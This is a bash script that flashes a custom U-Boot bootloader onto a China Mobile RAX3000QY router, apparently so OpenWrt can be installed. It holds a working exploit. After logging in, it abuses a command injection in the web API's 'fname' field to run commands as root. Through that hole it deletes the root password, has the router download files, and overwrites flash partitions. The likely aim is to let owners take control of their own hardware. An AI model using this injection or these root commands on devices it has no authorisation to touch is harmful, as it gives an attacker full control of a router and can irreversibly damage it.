#!/bin/bash
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { echo -e "${CYAN}[*]${NC} $1"; }
log_ok()    { echo -e "${GREEN}[✓]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()   { echo -e "${RED}[✗]${NC} $1"; }

cleanup() {
    if [[ -n "${HTTP_PID:-}" ]] && kill -0 "$HTTP_PID" 2>/dev/null; then
        kill "$HTTP_PID" 2>/dev/null
    fi
}
trap cleanup EXIT

ROUTER_IP="${ROUTER_IP:-192.168.10.1}"
ROUTER_USER="${ROUTER_USER:-user}"
ROUTER_PASS="${ROUTER_PASS:-}"
UBOOT_DIR="${1:-}"

UBOOT_FILE="nwrt_rax3000qy_uboot.mbn"
MIBIB_FILE="nwrt_rax3000qy_mibib.bin"
HTTP_PORT=18888

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════╗"
echo "║   RAX3000QY U-Boot Flash Tool               ║"
echo "║   For China Mobile stock firmware            ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# --- Router IP ---
read -rp "Router IP [$ROUTER_IP]: " input
ROUTER_IP="${input:-$ROUTER_IP}"

# --- Login credentials ---
read -rp "Username [$ROUTER_USER]: " input
ROUTER_USER="${input:-$ROUTER_USER}"

if [[ -z "$ROUTER_PASS" ]]; then
    read -rsp "Password: " ROUTER_PASS
    echo
fi

# --- Uboot folder ---
if [[ -z "$UBOOT_DIR" ]]; then
    read -rp "Path to uboot folder: " UBOOT_DIR
fi
UBOOT_DIR="${UBOOT_DIR%/}"

if [[ ! -f "$UBOOT_DIR/$UBOOT_FILE" ]]; then
    log_err "File not found: $UBOOT_DIR/$UBOOT_FILE"
    exit 1
fi
if [[ ! -f "$UBOOT_DIR/$MIBIB_FILE" ]]; then
    log_err "File not found: $UBOOT_DIR/$MIBIB_FILE"
    exit 1
fi

log_ok "Found uboot files:"
ls -lh "$UBOOT_DIR/$UBOOT_FILE" "$UBOOT_DIR/$MIBIB_FILE"
echo

# --- Check connectivity ---
log_info "Checking connection to $ROUTER_IP..."
if ! ping -c 1 -W 3 "$ROUTER_IP" &>/dev/null; then
    log_err "Cannot reach $ROUTER_IP"
    exit 1
fi
log_ok "Router is reachable"

# --- Login ---
log_info "Logging in..."
TOKEN_RESP=$(curl -sf --connect-timeout 5 -X POST "http://$ROUTER_IP/itms" \
    -H 'Content-Type: application/json' \
    -d '{"key":"devinfo","method":"login_prepare","cmd":255}')

TOKEN=$(echo "$TOKEN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
HASH=$(echo -n "${TOKEN}${ROUTER_PASS}" | sha256sum | awk '{print $1}')

LOGIN_RESP=$(curl -sf --connect-timeout 5 -X POST "http://$ROUTER_IP/itms/login" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$ROUTER_USER\",\"passwd\":\"$HASH\",\"remember\":0,\"sessionId\":\"\"}")

RESULT=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
if [[ "$RESULT" != "0" ]]; then
    log_err "Login failed: $LOGIN_RESP"
    exit 1
fi

SESSION=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['sessionId'])")
log_ok "Login successful (session: ${SESSION:0:8}...)"

# --- Command injection helper ---
rce() {
    local cmd="$1"
    curl -sf --connect-timeout 10 -X POST "http://$ROUTER_IP/itms" \
        -H 'Content-Type: application/json' \
        -d "{\"method\":\"get\",\"cmd\":22,\"fname\":\"websys.log|$cmd\",\"sessionId\":\"$SESSION\"}" 2>/dev/null
}

# --- Test RCE ---
log_info "Testing command injection..."
RCE_TEST=$(rce "id")
if ! echo "$RCE_TEST" | grep -q "root"; then
    log_err "Command injection failed: $RCE_TEST"
    exit 1
fi
log_ok "RCE working (uid=0 root)"

# --- Remove root password ---
log_info "Removing root password..."
rce "passwd -d root" >/dev/null
SHADOW=$(rce "grep root /etc/shadow")
if echo "$SHADOW" | grep -q 'root::'; then
    log_ok "Root password removed"
else
    log_warn "Could not confirm, continuing..."
fi

# --- Find local IP ---
LOCAL_IP=$(ip route get "$ROUTER_IP" | grep -oP 'src \K\S+')
log_info "Local IP: $LOCAL_IP"

# --- Start HTTP server ---
log_info "Starting HTTP server on port $HTTP_PORT..."
cd "$UBOOT_DIR"
python3 -m http.server "$HTTP_PORT" --bind "$LOCAL_IP" &>/dev/null &
HTTP_PID=$!
sleep 1

if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    log_err "Failed to start HTTP server"
    exit 1
fi
log_ok "HTTP server running at http://$LOCAL_IP:$HTTP_PORT"

# --- Transfer files ---
log_info "Uploading $UBOOT_FILE to router..."
rce "wget -O /tmp/$UBOOT_FILE http://$LOCAL_IP:$HTTP_PORT/$UBOOT_FILE" >/dev/null

REMOTE_SIZE=$(rce "wc -c < /tmp/$UBOOT_FILE" | grep -oE '[0-9]+' | head -1)
LOCAL_SIZE=$(wc -c < "$UBOOT_DIR/$UBOOT_FILE" | tr -dc '0-9')
if [[ "$REMOTE_SIZE" -ne "$LOCAL_SIZE" ]]; then
    log_err "Size mismatch: local=$LOCAL_SIZE remote=$REMOTE_SIZE"
    exit 1
fi
log_ok "$UBOOT_FILE: $LOCAL_SIZE bytes"

log_info "Uploading $MIBIB_FILE to router..."
rce "wget -O /tmp/$MIBIB_FILE http://$LOCAL_IP:$HTTP_PORT/$MIBIB_FILE" >/dev/null

REMOTE_SIZE=$(rce "wc -c < /tmp/$MIBIB_FILE" | grep -oE '[0-9]+' | head -1)
LOCAL_SIZE=$(wc -c < "$UBOOT_DIR/$MIBIB_FILE" | tr -dc '0-9')
if [[ "$REMOTE_SIZE" -ne "$LOCAL_SIZE" ]]; then
    log_err "Size mismatch: local=$LOCAL_SIZE remote=$REMOTE_SIZE"
    exit 1
fi
log_ok "$MIBIB_FILE: $LOCAL_SIZE bytes"

# --- Stop HTTP server ---
kill "$HTTP_PID" 2>/dev/null
HTTP_PID=""
log_ok "HTTP server stopped"

# --- Confirm flash ---
echo
log_warn "ABOUT TO WRITE U-BOOT TO FLASH. THIS CANNOT BE UNDONE!"
echo -e "  mtd11 (APPSBL) <- $UBOOT_FILE"
echo -e "  mtd1  (MIBIB)  <- $MIBIB_FILE"
echo
read -rp "Continue flashing? (y/N): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    log_info "Aborted."
    exit 0
fi

# --- Flash U-Boot ---
log_info "Flashing $UBOOT_FILE -> mtd11 (APPSBL)..."
rce "mtd write /tmp/$UBOOT_FILE /dev/mtd11" >/dev/null

log_info "Verifying mtd11..."
VERIFY=$(rce "mtd verify /tmp/$UBOOT_FILE /dev/mtd11 2>&1")
if echo "$VERIFY" | grep -q "Success"; then
    log_ok "mtd11 verified OK"
else
    log_err "mtd11 verification failed: $VERIFY"
    exit 1
fi

log_info "Flashing $MIBIB_FILE -> mtd1 (MIBIB)..."
rce "mtd write /tmp/$MIBIB_FILE /dev/mtd1" >/dev/null

log_info "Verifying mtd1..."
VERIFY=$(rce "mtd verify /tmp/$MIBIB_FILE /dev/mtd1 2>&1")
if echo "$VERIFY" | grep -q "Success"; then
    log_ok "mtd1 verified OK"
else
    log_err "mtd1 verification failed: $VERIFY"
    exit 1
fi

echo
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   U-BOOT FLASHED SUCCESSFULLY!              ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo
echo "Next steps:"
echo "  1. Unplug the router power"
echo "  2. Set your PC to static IP: 192.168.1.2/24"
echo "  3. Hold the reset button, plug in power, hold for 10 seconds, then release"
echo "  4. Open http://192.168.1.1 to flash OpenWrt firmware"
